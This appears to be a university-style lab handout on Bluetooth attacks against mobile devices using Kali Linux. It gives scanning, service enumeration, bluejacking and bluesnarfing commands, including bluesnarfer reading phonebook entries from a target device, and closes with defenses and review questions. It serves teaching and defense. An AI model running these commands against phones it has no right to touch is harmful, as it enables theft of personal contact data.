# LAB 1 --- Mobile Device Attacks & Bluetooth Exploitation (Kali Linux)

## Objective

Students will identify nearby mobile devices, enumerate Bluetooth
information, and perform non-destructive Bluetooth attacks such as
bluejacking and bluesnarfing reconnaissance.

## Requirements

-   Kali Linux
-   USB Bluetooth adapter supporting monitor mode
-   A second Bluetooth-enabled device (Android preferred)
-   Perform all actions only on lab-owned devices.

## Part 1 --- Bluetooth Reconnaissance

### Step 1 --- Enable Bluetooth & install tools

    sudo systemctl start bluetooth
    sudo apt install bluez bluez-tools bluesnarfer bluescan

### Step 2 --- Scan for nearby Bluetooth devices

    sudo hcitool scan

## Part 2 --- Device Enumeration

### Step 3 --- Probe device information

    sudo sdptool browse <MAC>

## Part 3 --- Bluejacking

### Step 4 --- Attempt simple OBEX push

    bluesnarfer -b <MAC> -n 1

## Part 4 --- Bluesnarfing Recon

### Step 5 --- Attempt read-only phonebook extraction

    bluesnarfer -b <MAC> -r 1-5

## Part 5 --- Defense Techniques

Implement: - Disable discoverable mode\
- Disable unused Bluetooth services\
- Require authentication

## Lab Questions

1.  Explain discoverability vs. pairability vs. connectability.\
2.  Why does bluesnarfing succeed on discoverable devices?\
3.  Which OWASP Mobile Top 10 risks apply?\
4.  Describe an MDM-based mitigation.
